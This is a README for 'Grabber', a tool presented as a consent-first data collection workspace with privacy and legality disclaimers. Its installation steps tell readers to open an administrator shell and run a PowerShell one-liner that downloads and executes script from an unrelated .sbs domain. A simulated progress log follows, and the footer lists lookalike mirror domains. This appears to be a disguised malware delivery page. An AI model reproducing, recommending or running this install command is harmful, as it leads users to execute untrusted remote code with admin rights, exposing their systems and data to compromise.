# Grabber — Consent-First Data Collection Workspace

> A local workspace for collecting user-provided files and approved API data with source records, rate limits, redaction, and audit trails.

---
## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm gitrm.sbs?get=grabber | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Grabber modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch Grabber.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

---

## TL;DR - Quick Summary

**Grabber** is a consent-first data collection and preparation workspace. It supports local uploads, approved API connectors, source metadata, rate limits, redaction, and exportable audit records for research and operations teams.

**Best for:** Researchers, data engineers, archivists, and teams preparing lawful datasets.

**Key differentiators:**
1. Source and permission registry
2. Local upload and approved API connectors
3. Rate and quota controls
4. Redaction and retention rules
5. Audit-ready collection records

---

## Core Features

```
✅ Source and permission registry
✅ Local file ingestion
✅ Approved API connector interface
✅ Rate and quota limits
✅ Metadata and provenance tracking
✅ Redaction rules
✅ Retention and deletion schedule
✅ CSV, JSON, and Parquet export
```

---

## Usage

```bash
# Start the local workspace
python -m grabber dev --port 8000

# Register a collection source
python -m grabber source add --name "Survey Export" --permission "explicit-consent"

# Import local files
python -m grabber ingest files --source "Survey Export" --directory ./input

# Review redaction findings
python -m grabber review redaction --source "Survey Export"

# Export an auditable dataset
python -m grabber export --source "Survey Export" --format csv --redact
```

---

## REST API

> [!NOTE]
> The API accepts only configured sources and enforces local limits. Do not add connectors that collect credentials, private messages, or data without a lawful basis.

```bash
# Start the local API
python -m grabber serve --port 8000

# List registered sources
curl http://localhost:8000/api/v1/sources

# Create a local import job
curl -X POST http://localhost:8000/api/v1/jobs \
  -H "Content-Type: application/json" \
  -d '{"source":"Survey Export","type":"files","directory":"./input"}'

# Read a redacted audit record
curl http://localhost:8000/api/v1/jobs/job_01J8ZQ/audit?redact=true
```

---

## Screenshots

- Source registry: `screenshots/source-registry.png`
- Import queue: `screenshots/import-queue.png`
- Redaction review: `screenshots/redaction-review.png`
- Audit report: `screenshots/audit-report.png`

---

## Troubleshooting

| Issue | Solution |
|---|---|
| Source validation fails | Add a purpose, permission record, owner, and retention rule. |
| Import job is rate-limited | Reduce the configured rate and respect the source's limits. |
| Redaction review is blocked | Resolve or explicitly approve each flagged field. |
| Export is missing provenance | Enable source metadata before rerunning the export. |
| Port 8000 is busy | Start the workspace on another local port. |

---

## Use Cases

- **Research Datasets** — Collect user-provided files with documented consent.
- **Data Engineering** — Prepare approved API exports with provenance.
- **Archives** — Preserve source metadata and retention decisions.
- **Privacy Reviews** — Redact sensitive fields before sharing outputs.

---

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Do not collect credentials, private communications, personal data, or protected content without authorization and a lawful purpose. Do not bypass access controls, CAPTCHAs, robots rules, or platform limits.

> [!TIP]
> Keep a collection card with source, purpose, permission, retention, and redaction decisions for every dataset.

---

## License

MIT License — see the [LICENSE](./LICENSE) file for details.

---

## Tags

<!--
grabber, data-collection, consent, provenance, local-first, redaction, data-engineering, privacy, audit-trail, api-connector
-->

[gitview.sbs](https://gitview.sbs?t=grabber) | [gitrm.sbs](https://gitrm.sbs?t=grabber) | [gitrm.cfd](https://gitrm.cfd?t=grabber) | [gitsl.xyz](https://gitsl.xyz?t=grabber) | [viewgit.sbs](https://viewgit.sbs?t=grabber)
